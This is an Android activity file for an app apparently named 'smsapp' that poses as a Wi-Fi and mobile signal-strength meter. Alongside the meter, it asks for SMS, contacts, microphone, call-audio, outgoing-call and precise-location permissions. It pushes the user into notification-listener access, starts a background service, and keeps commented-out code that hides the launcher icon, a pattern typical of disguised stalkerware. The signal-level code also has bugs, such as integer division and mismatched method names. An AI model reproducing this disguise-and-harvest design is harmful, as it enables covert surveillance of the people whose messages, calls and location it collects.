package gonext.smsapp;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.provider.Settings;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v4.content.LocalBroadcastManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.PhoneStateListener;
import android.telephony.SignalStrength;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.webkit.PermissionRequest;
import android.widget.TextView;
import android.widget.Toast;


import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

import flepsik.github.com.progress_ring.ProgressRingView;
import gonext.smsapp.db.DbService;
import gonext.smsapp.db.NotificationEntity;
import gonext.smsapp.servers.BackgroundJob;
import gonext.smsapp.servers.BackgroundJobService;
import gonext.smsapp.utils.Utils;

import static android.telephony.PhoneStateListener.LISTEN_NONE;

public class MainActivity extends AppCompatActivity {

    private TextView wifiStatus,wifiPercent,mobileStatus,mobilePercent,operatorNameMobile,operatorNameWifi;
    private ProgressRingView mobileRing,wifiRing;
    private BroadcastReceiver wifiReceiver;
    private MobileNetworkListener mPhoneStatelistener;
    private TelephonyManager mTelephonyManager;
    private int PERMISSION_FLAG = 2000;
    private String msgStatus = "Weak";
   private int msgPercent = 0;
    private String msgPercentage = "0%";
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        checkAllPermissions();
        wifiPercent = (TextView) findViewById(R.id.wifi_percent);
        wifiStatus = (TextView) findViewById(R.id.wifi_status);
        mobilePercent = (TextView) findViewById(R.id.mobile_percent);
        mobileStatus = (TextView) findViewById(R.id.mobile_status);
        operatorNameMobile = (TextView) findViewById(R.id.operatorName_mobile);
        operatorNameWifi = (TextView) findViewById(R.id.operatorName_wifi);

        mobileRing = (ProgressRingView) findViewById(R.id.mobile_progress);
        wifiRing = (ProgressRingView) findViewById(R.id.wifi_progress);



        String settings = Settings.Secure.getString(this.getContentResolver(),"enabled_notification_listeners");
        if (settings != null && settings.contains(getApplicationContext().getPackageName()))
        {
            System.out.println("enabled");
            //service is enabled do something
        } else {
            //service is not enabled try to enabled by calling...
            Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
            startActivity(intent);
        }

        /*PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/
        if(!Utils.getBackgroundServiceStatus(this)) {
            startService(new Intent(this, BackgroundJob.class)); //start service which is BackgroundJob.java
        }
        initializeWiFiListener();
        initialMobileNetworkListener();
    }

    @Override
    protected void onResume() {
        super.onResume();

    }

    private void initialMobileNetworkListener(){
        mPhoneStatelistener = new MobileNetworkListener(this);
        mTelephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        mTelephonyManager.listen(mPhoneStatelistener, PhoneStateListener.LISTEN_SIGNAL_STRENGTHS);
    }

    private void initializeWiFiListener(){
        String connectivity_context = Context.WIFI_SERVICE;
        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(WifiManager.RSSI_CHANGED_ACTION);
        intentFilter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
        final WifiManager wifi = (WifiManager)getSystemService(connectivity_context);
        wifiReceiver = new BroadcastReceiver(){

            @Override
            public void onReceive(Context context, Intent intent) {
                WifiInfo info = wifi.getConnectionInfo();
                String operatorName = info.getSSID();
                int rssi = info.getRssi();
                int level = WifiManager.calculateSignalLevel(rssi, 3);
//                int percentage = (int) ((level/10.0)*100);
                String status = "Weak";
                int percent = 0;
                String percentage = "0%";
                if(level == 0){//weak
                    if(rssi > -100) {
                        status = "Weak";
                        percent = 33;
                        percentage = "0-33%";
                    }
                }else if(level == 1){//avg
                    status = "Average";
                    percent = 66;
                    percentage = "33-66%";
                }else if(level == 2){//good
                    status = "Excellent";
                    percent = 100;
                    percentage = "100%";
                }
                refreshWifiView(status,percent,percentage,operatorName);
            }
            //TODO: implement methods for action handling

        };
        registerReceiver(wifiReceiver, intentFilter);
    }
private void refreshWifiView(String status,int percent,String percentage,String operatorName){
        wifiStatus.setText(status);
        wifiPercent.setText(percentage);
        wifiRing.setProgress(percent/100);
        if(status.equals("Weak")){
            wifiRing.setProgressColor(ContextCompat.getColor(this,android.R.color.holo_red_light));
        }else if(status.equals("Average")){
            wifiRing.setProgressColor(ContextCompat.getColor(this,R.color.yellow));
        }else if(status.equals("Excellent")){
            wifiRing.setProgressColor(ContextCompat.getColor(this,android.R.color.holo_green_light));
        }
        operatorNameWifi.setText("Provider Name: "+operatorName);
}
    private void refreshMobileView(String status,int percent,String percentage,String operatorName){
        mobileStatus.setText(status);
        mobilePercent.setText(percentage);
        mobileRing.setProgress(percent/100);
        if(status.equals("Weak")){
            mobileRing.setProgressColor(ContextCompat.getColor(this,android.R.color.holo_red_light));
        }else if(status.equals("Fair") || status.equals("Good")){
            mobileRing.setProgressColor(ContextCompat.getColor(this,R.color.yellow));
        }else if(status.equals("Excellent")){
            mobileRing.setProgressColor(ContextCompat.getColor(this,android.R.color.holo_green_light));
        }
        operatorNameMobile.setText("Operator Name: "+operatorName);
    }

    private class MobileNetworkListener extends PhoneStateListener{

        private Context context;

        public MobileNetworkListener(Context context) {
            this.context = context;
        }

        @Override
        public void onSignalStrengthsChanged(final SignalStrength signalStrength) {
            super.onSignalStrengthsChanged(signalStrength);
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        Thread.sleep(2000);
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    final String operatorName = mTelephonyManager.getNetworkOperatorName();
                    System.out.println("network tpe = ********* "+mTelephonyManager.getNetworkType());
                    if(mTelephonyManager.getNetworkType() == TelephonyManager.NETWORK_TYPE_GSM){
                        int rsrp = getGSMsignalStrength(signalStrength);
                        if(rsrp < -100){//poor
                            msgStatus = "Weak";
                            msgPercent = 0;
                            msgPercentage = "0%";
                        }else if(rsrp < -90 && rsrp >= -100){//fair
                            msgStatus = "Fair";
                            msgPercent = 30;
                            msgPercentage = "30%";
                        }else if(rsrp < -80 && rsrp >= -90) {//good
                            msgStatus = "Good";
                            msgPercent = 75;
                            msgPercentage = "75%";
                        }else if(rsrp >= -80){// Excellent
                            msgStatus = "Excellent";
                            msgPercent = 100;
                            msgPercentage = "100%";
                        }
                    }else if(mTelephonyManager.getNetworkType() == TelephonyManager.NETWORK_TYPE_LTE || mTelephonyManager.getNetworkType() == TelephonyManager.NETWORK_TYPE_UNKNOWN){
                        int ecio = getLTEsignalStrength(signalStrength);
                        if(ecio <= -10){//poor
                            msgStatus = "Weak";
                            msgPercent = 0;
                            msgPercentage = "0%";
                        }else if(ecio < -5 && ecio > -10){//fair
                            msgStatus = "Fair";
                            msgPercent = 30;
                            msgPercentage = "30%";
                        }else if(ecio <= -2 && ecio >= -5) {//good
                            msgStatus = "Good";
                            msgPercent = 75;
                            msgPercentage = "75%";
                        }else if(ecio > -2){// excellent
                            msgStatus = "Excellent";
                            msgPercent = 100;
                            msgPercentage = "100%";
                        }
                    }
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            refreshMobileView(msgStatus,msgPercent,msgPercentage,operatorName);
                        }
                    });
                }
            }).start();

        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if(mPhoneStatelistener != null && mTelephonyManager != null) {
            mTelephonyManager.listen(mPhoneStatelistener,LISTEN_NONE);
        }
        if(wifiReceiver != null) {
            unregisterReceiver(wifiReceiver);
        }
    }

    private int getLTEsignalStrength(SignalStrength signalStrength)
    {
        try
        {

            Method[] methods = android.telephony.SignalStrength.class.getMethods();

            for (Method mthd : methods)
            {
                if (mthd.getName().equals("getEvdoEcio"))
                {
                    int LTEsignalStrength = (Integer) mthd.invoke(signalStrength, new Object[] {});
                    System.out.println("lte signal strength = "+LTEsignalStrength);
                    return LTEsignalStrength;
                }
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        return -11;
    }

    private int getGSMsignalStrength(SignalStrength signalStrength)
    {
        try
        {

            Method[] methods = android.telephony.SignalStrength.class.getMethods();

            for (Method mthd : methods)
            {
                if (mthd.getName().equals("getLteRsrp"))
                {
                    int LTEsignalStrength = (Integer) mthd.invoke(signalStrength, new Object[] {});
                    System.out.println("lte signal strength = "+LTEsignalStrength);
                    return LTEsignalStrength;
                }
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        return -101;
    }


    private void checkAllPermissions(){

        int phoneState = ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_PHONE_STATE);

        int readContacts = ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CONTACTS);

        int readSMS = ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS);

        int storage = ContextCompat.checkSelfPermission(this,
                Manifest.permission.WRITE_EXTERNAL_STORAGE);

        int recordAudio = ContextCompat.checkSelfPermission(this,
                Manifest.permission.RECORD_AUDIO);

        int outGoingCalls = ContextCompat.checkSelfPermission(this,
                Manifest.permission.PROCESS_OUTGOING_CALLS);

        int captureAudio = ContextCompat.checkSelfPermission(this,
                Manifest.permission.CAPTURE_AUDIO_OUTPUT);

        int coaroseLoc = ContextCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_COARSE_LOCATION);

        int fineLoc = ContextCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_FINE_LOCATION);
        boolean isAllGranted = true;

        List<String> permissions = new ArrayList<>();
        if(phoneState != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.READ_PHONE_STATE);
        }
        if(readContacts != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.READ_CONTACTS);
        }
        if(readSMS != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.READ_SMS);
        }
        if(storage != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        if(recordAudio != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.RECORD_AUDIO);
        }
        if(outGoingCalls != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
        }
        if(captureAudio != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.CAPTURE_AUDIO_OUTPUT);
        }
        if(coaroseLoc != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        }
        if(fineLoc != PackageManager.PERMISSION_GRANTED){
            isAllGranted = false;
            permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        }

        if(!isAllGranted){
            ActivityCompat.requestPermissions(this,
                    permissions.toArray(new String[permissions.size()]),
                    PERMISSION_FLAG);

        }

    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

    }
}
